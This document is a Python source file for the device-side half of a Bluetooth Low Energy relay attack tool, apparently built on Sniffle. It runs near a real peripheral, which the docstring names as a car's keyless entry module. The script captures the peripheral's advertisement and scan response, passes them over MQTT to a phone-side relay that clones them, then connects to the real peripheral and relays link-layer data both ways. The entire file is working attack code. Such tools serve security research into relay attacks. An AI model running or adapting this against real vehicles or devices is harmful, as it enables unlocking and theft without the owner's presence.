#!/usr/bin/env python3

# BLE MQTT Relay - Device Side (Car-side)
# Scans the target BLE peripheral, captures its advertisement/scan response,
# and forwards to the phone-side relay via MQTT. After the phone-side relay
# establishes a connection, this node connects to the real peripheral and
# transparently relays BLE link-layer data.
#
# Copyright (c) 2026, oyyunshen
# Based on Sniffle by Sultan Qasim Khan (NCC Group plc), licensed under GPLv3
# Released as open source under GPLv3

"""
This script runs near the real BLE peripheral (e.g., a car's keyless entry module).
It captures the target's advertisement, publishes it to MQTT for the phone-side
relay to clone, then after receiving the phone-side's CONNECT_IND, connects to the
real peripheral and relays all data traffic bidirectionally.

Architecture:
    [This Script + Sniffle Board] <--BLE--> Real Peripheral (Car)
              |
              MQTT
              |
    [Phone-side Relay] <--BLE--> Phone/Central
"""

import argparse
import signal
import socket
import sys
import time
import threading

from paho.mqtt import client as mqtt_client
from paho.mqtt.enums import CallbackAPIVersion

from sniffle.sniffle_hw import SniffleHW, BLE_ADV_AA, SnifferMode
from sniffle.packet_decoder import (
    PacketMessage, DPacketMessage, DataMessage, LlDataContMessage,
    AdvaMessage, AdvDirectIndMessage, AdvExtIndMessage, ScanRspMessage,
    ConnectIndMessage, LlControlMessage, str_mac2
)
from sniffle.sniffer_state import StateMessage, SnifferState
from sniffle.measurements import MeasurementMessage
from sniffle.errors import SniffleHWPacketError
from sniffle.pcap import PcapBleWriter


class Advertiser:
    """Track statistics for a single advertising device."""

    def __init__(self):
        self.adv = None
        self.scan_rsp = None
        self.rssi_min = -128
        self.rssi_max = -128
        self.rssi_avg = -128
        self.hits = 0

    def add_hit(self, rssi):
        if self.hits == 0:
            self.rssi_min = rssi
            self.rssi_max = rssi
            self.rssi_avg = rssi
        else:
            self.rssi_min = min(self.rssi_min, rssi)
            self.rssi_max = max(self.rssi_max, rssi)
            self.rssi_avg = (self.rssi_avg * self.hits + rssi) / (self.hits + 1)
        self.hits += 1


class RelayCentral:
    """Device-side (car-side) BLE relay node — acts as BLE Central to connect to the real peripheral."""

    def __init__(self, args):
        self.args = args
        self.hw = None
        self.mqtt = None
        self.pcwriter = None

        # State
        self.target_adva = Advertiser()
        self.conn_req = None
        self.is_connected = False
        self.central_ready = False
        self.cur_aa = 0
        self.mac_bytes = [int(h, 16) for h in reversed(args.target.split(":"))]
        self.hw_lock = threading.Lock()

    def run(self):
        """Main entry point."""
        self._setup_hardware()
        self._scan_target()
        self._setup_mqtt()
        self._publish_advertisement()
        self._wait_for_connection()
        self._connect_to_peripheral()
        self._relay_loop()

    def _setup_hardware(self):
        """Initialize Sniffle hardware for scanning."""
        self.hw = SniffleHW(self.args.serport)
        self.hw.cmd_chan_aa_phy(37, BLE_ADV_AA, 0)
        self.hw.cmd_pause_done(True)
        self.hw.cmd_follow(False)
        self.hw.cmd_rssi(-128)
        self.hw.cmd_mac()
        self.hw.cmd_auxadv(False)
        self.hw.random_addr()
        self.hw.cmd_scan()
        self.hw.mark_and_flush()

        if self.args.output:
            self.pcwriter = PcapBleWriter(self.args.output)

    def _scan_target(self):
        """Scan until we capture both ADV_IND and SCAN_RSP from target."""
        print(f"[*] Scanning for target: {self.args.target}")
        got_adv = False
        got_rsp = False

        while not (got_adv and got_rsp):
            msg = self.hw.recv_and_decode()
            if not isinstance(msg, PacketMessage):
                continue

            dpkt = DPacketMessage.decode(msg)
            if not self._is_target_adv(dpkt):
                continue

            self.target_adva.add_hit(dpkt.rssi)
            if isinstance(dpkt, ScanRspMessage):
                self.target_adva.scan_rsp = dpkt
                got_rsp = True
                print(f"  [+] Captured SCAN_RSP")
            else:
                self.target_adva.adv = dpkt
                got_adv = True
                print(f"  [+] Captured ADV_IND")

        print(f"\n{'='*60}")
        print(f"[+] Target captured: {self.args.target}")
        print(f"    RSSI: avg={self.target_adva.rssi_avg:.1f} "
              f"min={self.target_adva.rssi_min} max={self.target_adva.rssi_max}")
        print(f"    Hits: {self.target_adva.hits}")
        print(f"{'='*60}\n")

    def _is_target_adv(self, dpkt) -> bool:
        """Check if decoded packet is from our target."""
        if isinstance(dpkt, AdvaMessage) or isinstance(dpkt, AdvDirectIndMessage):
            adva = str_mac2(dpkt.AdvA, dpkt.TxAdd)
            return self.args.target.upper() in adva.upper()
        if isinstance(dpkt, AdvExtIndMessage) and dpkt.AdvA is not None:
            adva = str_mac2(dpkt.AdvA, dpkt.TxAdd)
            return self.args.target.upper() in adva.upper()
        return False

    def _setup_mqtt(self):
        """Connect to MQTT broker."""
        client_id = f"relay-device-{int(time.time()) % 10000}"
        self.mqtt = mqtt_client.Client(CallbackAPIVersion.VERSION2, client_id)
        self.mqtt.on_connect = self._on_connect
        self.mqtt.on_message = self._on_message

        print(f"[*] Connecting to MQTT broker {self.args.broker}:{self.args.mqtt_port}...")
        self.mqtt.connect(self.args.broker, self.args.mqtt_port)
        self.mqtt.subscribe(self.args.sub_topic)
        self.mqtt.loop_start()

    def _on_connect(self, client, userdata, flags, rc, properties=None):
        if rc == 0:
            print("[+] Connected to MQTT Broker")
            if client._sock is not None:
                client._sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            client.subscribe(self.args.sub_topic)
        else:
            print(f"[-] MQTT connection failed, code: {rc}")
            sys.exit(1)

    def _on_message(self, client, userdata, msg):
        """Handle messages from the phone-side relay."""
        try:
            payload = msg.payload.decode()
            msg_type = payload[:3]
            msg_data = payload[4:]

            if msg_type == "con":
                self._handle_connect_message(msg_data)
            elif msg_type == "dat":
                self._handle_data_message(msg_data)
        except Exception as e:
            print(f"[-] Error processing MQTT message: {e}")

    def _handle_connect_message(self, data: str):
        """Phone-side relay has received CONNECT_IND from central."""
        self.conn_req = DPacketMessage.from_body(bytes.fromhex(data))
        if not isinstance(self.conn_req, ConnectIndMessage):
            print("[-] Invalid CONNECT_IND message")
            return
        self.is_connected = True
        print("[+] Phone-side relay reports connection established")

    def _handle_data_message(self, data: str):
        """Forward data from phone-side relay to BLE peripheral."""
        if self.hw is None or not self.central_ready:
            return
        event_hex, body_hex = data.split(":", 1)
        body = bytes.fromhex(body_hex)
        if len(body) < 2:
            return
        event = int(event_hex, 16)
        llid = body[0] & 3
        pdu = body[2:]

        # Filter out LL control PDUs with instants that may have expired
        pkt = DPacketMessage.from_body(body, True)
        if isinstance(pkt, LlControlMessage) and pkt.opcode in [0x00, 0x01, 0x18]:
            if not self.args.quiet:
                print(f"  >> Filtered LL control with instant (opcode=0x{pkt.opcode:02x})")
            return

        with self.hw_lock:
            self.hw.cmd_transmit(llid, pdu, event)
        if not self.args.quiet:
            print(f"  >> BLE TX: LLID={llid} len={len(pdu)} event={event}")

    def _publish(self, payload: str):
        """Publish message to the phone-side relay."""
        self.mqtt.publish(self.args.pub_topic, payload.encode(), qos=0)

    def _publish_advertisement(self):
        """Send captured advertisement data to phone-side relay."""
        # Use retain=True so the phone-side relay can receive even if it starts later
        adv_body = self.target_adva.adv.body.hex()
        rsp_body = self.target_adva.scan_rsp.body.hex()

        self.mqtt.publish(
            self.args.pub_topic, f"adv:{adv_body}".encode(),
            qos=1, retain=True
        )
        self.mqtt.publish(
            self.args.pub_topic + "/rsp", f"rsp:{rsp_body}".encode(),
            qos=1, retain=True
        )
        print("[+] Published ADV + SCAN_RSP to MQTT (retained)")
        print("[*] Waiting for phone-side relay to receive connection...")

    def _wait_for_connection(self):
        """Block until the phone-side relay reports a connection."""
        while not self.is_connected:
            time.sleep(0.01)

    def _connect_to_peripheral(self):
        """Initiate BLE connection to the real peripheral."""
        print("[*] Connecting to real peripheral...")

        # Reconfigure hardware for connection initiation
        self.hw.cmd_chan_aa_phy(37, BLE_ADV_AA, 0)
        self.hw.cmd_pause_done(True)
        self.hw.cmd_follow(False)
        self.hw.cmd_rssi(-128)
        self.hw.cmd_mac(self.mac_bytes, False)
        self.hw.cmd_auxadv(False)
        self.hw.cmd_setaddr(self.conn_req.InitA, bool(self.conn_req.TxAdd))
        self.hw.cmd_interval_preload()
        self.hw.cmd_phy_preload()
        self.hw.mark_and_flush()

        # Initiate connection using parameters from the relayed CONNECT_IND
        targ_random = bool(self.target_adva.adv.TxAdd)
        self.hw.initiate_conn(
            self.mac_bytes, targ_random,
            self.conn_req.Interval, self.conn_req.Latency
        )

        # Wait for connection establishment
        while True:
            msg = self.hw.recv_and_decode()
            if isinstance(msg, StateMessage) and msg.new_state == SnifferState.CENTRAL:
                self.cur_aa = self.conn_req.aa_conn
                self.hw.decoder_state.cur_aa = self.cur_aa
                break

        # Clear retained messages now that connection is established
        self.mqtt.publish(self.args.pub_topic, b"", qos=1, retain=True)
        self.mqtt.publish(self.args.pub_topic + "/rsp", b"", qos=1, retain=True)

        self.central_ready = True
        print("[+] Connected to real peripheral! Relay active.")

    def _relay_loop(self):
        """Main BLE receive and forward loop."""
        while True:
            try:
                with self.hw_lock:
                    msg = self.hw.recv_and_decode()
                if isinstance(msg, PacketMessage):
                    self._process_packet(msg)
                elif isinstance(msg, StateMessage):
                    print(f"  [State] {msg}")
                    if msg.new_state == SnifferState.CENTRAL:
                        self.hw.decoder_state.cur_aa = self.cur_aa
                elif isinstance(msg, MeasurementMessage):
                    if not self.args.quiet:
                        print(f"  [Meas] {msg}")
            except SniffleHWPacketError as e:
                print(f"  [!] HW packet error: {e}")
            except KeyboardInterrupt:
                print("\n[*] Stopping...")
                break

    def _process_packet(self, pkt: PacketMessage):
        """Decode and forward BLE packet to phone-side relay."""
        dpkt = DPacketMessage.decode(pkt)

        if isinstance(dpkt, DataMessage):
            is_empty = isinstance(dpkt, LlDataContMessage) and dpkt.data_length == 0
            if not is_empty:
                payload = f"dat:{dpkt.event:04x}:{dpkt.body.hex()}"
                self._publish(payload)
                if not self.args.quiet:
                    print(f"  << BLE RX: len={dpkt.data_length} event={dpkt.event}")
            pdu_type = 3 if dpkt.data_dir else 2
        else:
            pdu_type = 0

        if self.pcwriter:
            self.pcwriter.write_packet(
                int(pkt.ts_epoch * 1000000), pkt.aa, pkt.chan,
                pkt.rssi, pkt.body, pkt.phy, pdu_type
            )


def main():
    parser = argparse.ArgumentParser(
        description="BLE MQTT Relay - Device Side (runs near the target BLE peripheral)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -B mqtt.example.com -t C6:07:59:15:53:5F -s /dev/ttyACM0
  %(prog)s -B 192.168.1.100 -P 8883 -t AA:BB:CC:DD:EE:FF -s COM3 -o capture.pcapng
        """
    )
    parser.add_argument("-B", "--broker", required=True,
                        help="MQTT broker address (IP or hostname)")
    parser.add_argument("-P", "--mqtt-port", type=int, default=1883,
                        help="MQTT broker port (default: 1883)")
    parser.add_argument("-t", "--target", required=True,
                        help="Target BLE MAC address (e.g., C6:07:59:15:53:5F)")
    parser.add_argument("-s", "--serport", default=None,
                        help="Sniffle serial port (auto-detect if not specified)")
    parser.add_argument("-o", "--output", default=None,
                        help="PCAP output file for traffic capture")
    parser.add_argument("-q", "--quiet", action="store_true",
                        help="Suppress per-packet output")
    parser.add_argument("--pub-topic", default="/ble_relay/to_phone",
                        help="MQTT publish topic (default: /ble_relay/to_phone)")
    parser.add_argument("--sub-topic", default="/ble_relay/to_device",
                        help="MQTT subscribe topic (default: /ble_relay/to_device)")
    args = parser.parse_args()

    relay = RelayCentral(args)

    def sigint_handler(sig, frame):
        print("\n[*] Interrupted, cleaning up...")
        if relay.hw:
            relay.hw.cmd_chan_aa_phy()
        sys.exit(0)

    signal.signal(signal.SIGINT, sigint_handler)
    relay.run()


if __name__ == "__main__":
    main()
